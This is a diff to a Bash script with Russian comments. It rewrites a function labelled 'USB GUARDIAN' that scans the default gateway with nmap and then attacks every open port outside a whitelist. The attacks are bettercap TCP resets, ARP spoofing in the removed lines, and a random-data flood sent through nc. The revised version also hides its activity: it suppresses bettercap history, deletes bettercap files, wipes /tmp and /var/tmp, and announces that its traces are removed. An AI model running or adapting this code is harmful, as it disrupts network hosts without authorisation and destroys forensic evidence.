@@ -220,73 +220,43 @@ find . -type d -name "__pycache__" -exec rm -rf {} + 2>/dev/null
     sleep 3
 }
 
-# --- АВТОНОМНЫЙ ЭВРИСТИЧЕСКИЙ МОДУЛЬ: USB GUARDIAN v4.1 (Whitelist Edition) ---
+# --- СТЕРИЛЬНЫЙ ЭВРИСТИЧЕСКИЙ МОДУЛЬ: USB GUARDIAN v4.2 ---
 
 usb_guardian_smart() {
-    # БЕЛЫЙ СПИСОК: Порты, которые МЫ НЕ ТРОГАЕМ (например: 22-SSH, 80/443-Web, 3389-RDP)
-    # Ты можешь добавить сюда порты своих игр или рабочих программ через запятую
     WHITELIST="22,80,443,3389,8080"
-
-    echo -e "${YELLOW}[*] Инициализация Эвристического Анализа (v4.1)...${NC}"
+    echo -e "${YELLOW}[*] Запуск стерильного анализа...${NC}"
+    
     TARGET_IP=$(ip route | grep default | awk '{print $3}')
-    
-    if [[ -z "$TARGET_IP" ]]; then
-        echo -e "${RED}[-] Цель не найдена. Проверь USB-модем.${NC}"
-        read -p "Нажми Enter..." ; return
-    fi
+    [[ -z "$TARGET_IP" ]] && { echo -e "${RED}[-] Цель не найдена.${NC}"; return; }
 
-    echo -e "${CYAN}[+] Цель: $TARGET_IP. Белый список: [$WHITELIST]${NC}"
-    
-    # Сканируем top-100 опасных портов
-    SCAN_RES=$(nmap -sV --top-ports 100 --open "$TARGET_IP")
+    # Nmap с флагом -n (без поиска DNS, чтобы не плодить кэш)
+    SCAN_RES=$(nmap -n -sV --top-ports 100 --open "$TARGET_IP")
     ALL_OPEN=$(echo "$SCAN_RES" | grep "open" | awk -F'/' '{print $1}')
 
-    FOUND_THREATS=false
-
     for port in $ALL_OPEN; do
-        # Проверяем, входит ли порт в Белый список
-        if echo ",$WHITELIST," | grep -q ",$port,"; then
-            echo -e "${BLUE}[i] Порт $port в белом списке. Пропускаю...${NC}"
-            continue
-        fi
+        if echo ",$WHITELIST," | grep -q ",$port,"; then continue; fi
 
-        FOUND_THREATS=true
-        echo -e "${RED}[!!!] ОБНАРУЖЕНА УГРОЗА: Порт $port${NC}"
+        echo -e "${RED}[!!!] Подавление порта $port...${NC}"
         
-        # --- ЦИКЛ ПОДАВЛЕНИЯ ---
+        # Bettercap в режиме "silent" и без записи логов (-no-history -no-colors)
+        # Направляем всё в /dev/null, чтобы не забивать память выводами
+        timeout 7s bettercap -no-history -no-colors -eval "net.recon on; tcp.reset on" -target "$TARGET_IP" > /dev/null 2>&1
         
-        # 1. TCP Reset
-        echo -e "${YELLOW}[1/3] Попытка мгновенного разрыва...${NC}"
-        timeout 5s bettercap -eval "net.recon on; tcp.reset on" -target "$TARGET_IP" >/dev/null 2>&1
-        
-        # 2. ARP Изоляция (если порт всё еще открыт)
+        # Если порт еще жив — используем эвристический флуд
         if nmap -p "$port" "$TARGET_IP" | grep -q "open"; then
-            echo -e "${YELLOW}[2/3] Изоляция трафика (ARP Poisoning)...${NC}"
-            timeout 10s bettercap -eval "set arp.spoof.targets $TARGET_IP; arp.spoof on" >/dev/null 2>&1
-        fi
-
-        # 3. Эвристический Flood (Финальный удар)
-        if nmap -p "$port" "$TARGET_IP" | grep -q "open"; then
-            echo -e "${YELLOW}[3/3] Забивание канала мусором (Fuzzing)...${NC}"
-            ( head -c 5M < /dev/urandom | nc -nv "$TARGET_IP" "$port" ) & >/dev/null 2>&1
-            sleep 3
-            kill $! 2>/dev/null
-        fi
-
-        # Итог по конкретному порту
-        if ! nmap -p "$port" "$TARGET_IP" | grep -q "open"; then
-            echo -e "${GREEN}[V] Порт $port успешно нейтрализован.${NC}"
-        else
-            echo -e "${RED}[!] Порт $port стоек. Возможно, это системная служба.${NC}"
+             ( head -c 5M < /dev/urandom | nc -nv "$TARGET_IP" "$port" ) > /dev/null 2>&1 &
+             sleep 3 && kill $! 2>/dev/null
         fi
     done
 
-    if [ "$FOUND_THREATS" = false ]; then
-        echo -e "${GREEN}[+] Опасных сетевых активностей не обнаружено.${NC}"
-    fi
-
-    echo -e "${CYAN}[*] Зачистка логов...${NC}"
-    apt-get clean >/dev/null 2>&1
+    # --- МГНОВЕННАЯ ЗАЧИСТКА ХВОСТОВ ---
+    echo -e "${CYAN}[*] Стерилизация временных файлов...${NC}"
+    # Удаляем историю bettercap, если она успела создаться
+    rm -rf ~/.bettercap_history ~/.bettercap.cap 2>/dev/null
+    # Очищаем временные файлы сетевых сканеров
+    rm -rf /tmp/* /var/tmp/* 2>/dev/null
+    
+    echo -e "${GREEN}[V] Проверка завершена. Следы удалены.${NC}"
     read -p "Нажми Enter..."
 }
 
